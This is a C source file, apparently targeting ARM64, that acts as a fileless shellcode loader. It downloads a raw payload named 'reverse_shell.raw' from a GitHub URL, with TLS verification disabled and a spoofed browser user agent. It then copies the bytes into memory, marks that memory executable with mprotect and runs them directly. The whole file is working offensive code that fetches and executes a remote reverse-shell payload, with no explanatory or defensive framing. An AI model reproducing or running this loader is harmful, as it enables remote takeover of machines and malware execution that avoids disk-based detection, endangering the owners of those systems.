#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <curl/curl.h>

// Invalidate and flush instruction cache
void clean_cache(void *addr, size_t size) {
    __asm__ volatile("dc cvau, %0\n"
                     "ic ivau, %0\n"
                     "dsb ish\n"
                     "isb\n"
                     :
                     : "r"(addr)
                     : "memory");
}

// Struct to hold downloaded data
struct Buffer {
    char *content;
    size_t length;
};

// Callback function to handle downloaded chunks
static size_t buffer_writer(void *input, size_t size, size_t nmemb, void *output) {
    size_t total_size = size * nmemb;
    struct Buffer *buf = (struct Buffer *)output;

    char *temp = realloc(buf->content, buf->length + total_size + 1);
    if (temp == NULL) {
        fprintf(stderr, "Insufficient memory to store data.\n");
        return 0;
    }

    buf->content = temp;
    memcpy(&(buf->content[buf->length]), input, total_size);
    buf->length += total_size;
    buf->content[buf->length] = 0;

    return total_size;
}

// Function to retrieve remote data
char *fetch_data(const char *source, size_t *size) {
    CURL *curl;
    CURLcode res;
    struct Buffer chunk = {0};

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, source);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, buffer_writer);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "cURL error: %s\n", curl_easy_strerror(res));
            free(chunk.content);
            chunk.content = NULL;
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    *size = chunk.length;
    return chunk.content;
}

// Function to deploy and execute binary in memory
void deploy_code(void *binary, size_t size) {
    size_t aligned_size = (size + 15) & ~15;

    void *exec_space = mmap(NULL, aligned_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (exec_space == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    memcpy(exec_space, binary, size);
    clean_cache(exec_space, aligned_size);

    if (mprotect(exec_space, aligned_size, PROT_READ | PROT_EXEC) != 0) {
        perror("mprotect");
        munmap(exec_space, aligned_size);
        exit(1);
    }

    printf("[*] Executable loaded at: %p\n", exec_space);
    printf("[*] Running executable...\n");

    void (*run)() = exec_space;
    run();

    munmap(exec_space, aligned_size);
}

int main() {
    const char *endpoint = "https://github.com/xBurningGiraffe/Misc.Scripts/raw/refs/heads/main/reverse_shell.raw";
    size_t binary_size;

    printf("[*] Retrieving data from: %s\n", endpoint);
    char *binary = fetch_data(endpoint, &binary_size);
    if (!binary) {
        fprintf(stderr, "Failed to retrieve data.\n");
        return 1;
    }

    deploy_code(binary, binary_size);
    free(binary);

    return 0;
}
